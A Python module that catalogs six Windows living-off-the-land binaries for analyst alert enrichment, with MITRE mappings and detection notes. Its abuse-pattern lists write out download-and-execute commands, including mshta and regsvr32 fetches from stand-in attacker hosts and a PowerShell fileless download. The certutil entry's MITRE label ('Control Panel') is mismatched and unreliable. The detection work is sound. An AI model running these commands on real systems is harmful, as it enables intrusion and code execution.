"""LOLBin behavioral catalog — per-binary attack descriptions for analyst enrichment.

Maps detected binary names to technique description, abuse patterns,
MITRE ATT&CK sub-technique, detection notes, and typical kill-chain stage.
All entries sourced from LOLBAS Project (lolbas-project.github.io) and MITRE ATT&CK.
Safe for direct display in analyst consoles and incident tickets.
"""
from __future__ import annotations
from typing import Any, Dict, List

LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
    "certutil": {
        "full_name": "certutil.exe",
        "mitre_sub_technique": "T1218.002",
        "mitre_technique_name": "System Binary Proxy Execution: Control Panel",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows certificate management utility present on every modern Windows installation. "
            "Abused via '-urlcache -split -f <URL>' to download arbitrary files from "
            "internet-accessible URLs, bypassing many proxy inspection policies because certutil "
            "is a signed Microsoft binary. Also used to decode base64 content via '-decode' "
            "for multi-stage payload delivery."
        ),
        "abuse_patterns": [
            "certutil -urlcache -split -f <url> <output>  # remote file download",
            "certutil -decode encoded.txt decoded.exe     # base64 decode",
            "certutil -encode binary.exe encoded.txt      # base64 encode for exfiltration",
        ],
        "detection_note": (
            "Parent process spawning certutil with '-urlcache' or '-decode' is a strong indicator. "
            "Monitor for network connections initiated by certutil.exe. Legitimate uses are limited "
            "to certificate store management by sysadmins."
        ),
        "kill_chain_stage": "delivery/execution",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "mshta": {
        "full_name": "mshta.exe",
        "mitre_sub_technique": "T1218.005",
        "mitre_technique_name": "System Binary Proxy Execution: Mshta",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Microsoft HTML Application host that executes HTA files containing VBScript or JScript. "
            "Abused to execute remote script payloads: 'mshta https://attacker.example/evil.hta'. "
            "Bypasses PowerShell execution policies and AppLocker rules targeting .ps1 files. "
            "Frequently used as the second stage after a phishing email attachment is opened."
        ),
        "abuse_patterns": [
            "mshta https://<attacker>/payload.hta                       # remote HTA execution",
            "mshta vbscript:Execute(\"CreateObject...\")(Window.Close)  # in-memory execution",
        ],
        "detection_note": (
            "mshta.exe making outbound HTTP/HTTPS connections is almost always malicious. "
            "Legitimate administrator use of mshta is extremely rare in modern environments."
        ),
        "kill_chain_stage": "execution",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "rundll32": {
        "full_name": "rundll32.exe",
        "mitre_sub_technique": "T1218.011",
        "mitre_technique_name": "System Binary Proxy Execution: Rundll32",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows DLL execution host abused to run JavaScript via 'rundll32 javascript:...' "
            "or to load arbitrary DLLs including remotely fetched ones. "
            "The 'rundll32 javascript:\"..\\mshtml,RunHTMLApplication\"' variant executes "
            "script directly in-memory without touching disk — classic fileless technique."
        ),
        "abuse_patterns": [
            "rundll32 javascript:\"..\\mshtml,RunHTMLApplication\";...  # in-memory JS execution",
            "rundll32 shell32.dll,ShellExec_RunDLL <payload>             # shell execution proxy",
        ],
        "detection_note": (
            "rundll32 invocations with 'javascript:' in the command line are a critical-severity "
            "indicator. Correlate with parent process and network connections."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "bitsadmin": {
        "full_name": "bitsadmin.exe",
        "mitre_sub_technique": "T1197",
        "mitre_technique_name": "BITS Jobs",
        "pasta_stage": "Stage3",
        "pasta_stage_name": "Stage3 — Application Decomposition & Threat Analysis",
        "description": (
            "Windows Background Intelligent Transfer Service administrator tool. Creates persistent "
            "BITS jobs that survive reboots and download files asynchronously in the background, "
            "evading real-time network monitoring. BITS jobs are re-executed on reboot automatically, "
            "providing a persistence mechanism."
        ),
        "abuse_patterns": [
            "bitsadmin /transfer job /download /priority normal <url> <dest>",
            "bitsadmin /create malicious; /addfile; /resume; /complete   # multi-step persistence",
        ],
        "detection_note": (
            "BITS jobs created by non-OS processes are anomalous. "
            "Check the BITS scheduled task queue and network connections from svchost."
        ),
        "kill_chain_stage": "persistence/delivery",
        "severity_weight": 0.75,
        "decode_path": "lolbin_command_decode",
    },
    "regsvr32": {
        "full_name": "regsvr32.exe",
        "mitre_sub_technique": "T1218.010",
        "mitre_technique_name": "System Binary Proxy Execution: Regsvr32",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "COM server registration utility. The 'Squiblydoo' technique uses "
            "'regsvr32 /s /n /u /i:<URL> scrobj.dll' to fetch and execute remote COM scriptlets "
            "over HTTP(S), bypassing AppLocker and application control policies. "
            "No child process is spawned — shellcode runs in the regsvr32 process context."
        ),
        "abuse_patterns": [
            "regsvr32 /s /n /u /i:https://<attacker>/payload.sct scrobj.dll  # Squiblydoo",
        ],
        "detection_note": (
            "regsvr32.exe network connections or loading remote SCT files is always malicious. "
            "Block regsvr32 from making outbound network calls via Windows Firewall rules."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "powershell": {
        "full_name": "powershell.exe",
        "mitre_sub_technique": "T1059.001",
        "mitre_technique_name": "Command and Scripting Interpreter: PowerShell",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "The '-EncodedCommand' / '-enc' flag accepts a Base64-encoded command string, "
            "commonly used to obfuscate malicious payloads and bypass script-based security "
            "controls. In-memory execution via 'Invoke-Expression' and 'IEX' leaves no script "
            "file on disk (fileless). '-WindowStyle Hidden' suppresses the console window to "
            "avoid detection by the user."
        ),
        "abuse_patterns": [
            "powershell -enc <base64>                              # encoded command obfuscation",
            "powershell -w hidden -enc <base64>                    # hidden window + encoding",
            "IEX (New-Object Net.WebClient).DownloadString(...)    # fileless download-execute",
        ],
        "detection_note": (
            "Base64-encoded PowerShell without a legitimate admin context is a high-severity "
            "indicator. Enable PowerShell Script Block Logging (Event ID 4104) and Transcript "
            "Logging to capture decoded commands before execution."
        ),
        "kill_chain_stage": "execution/c2",
        "severity_weight": 0.82,
        "decode_path": "lolbin_command_decode",
    },
}


def enrich_lolbin_indicators(lolbin_hits: List[str]) -> List[Dict[str, Any]]:
    """Return per-binary behavioral profiles for a list of detected LOLBin names.

    Args:
        lolbin_hits: list of lowercase binary name strings from regex match groups,
                     e.g. ['certutil', 'powershell -enc']

    Returns:
        List of dicts, one per unique detected binary, each with full behavioral context
        including MITRE sub-technique, PASTA stage, abuse patterns, and detection notes.
    """
    out: List[Dict[str, Any]] = []
    seen: set[str] = set()
    for hit in lolbin_hits:
        key = str(hit or "").strip().lower()
        for catalog_key in LOLBIN_CATALOG:
            if key.startswith(catalog_key) and catalog_key not in seen:
                seen.add(catalog_key)
                entry = dict(LOLBIN_CATALOG[catalog_key])
                entry["detected_as"] = hit
                out.append(entry)
                break
    return out
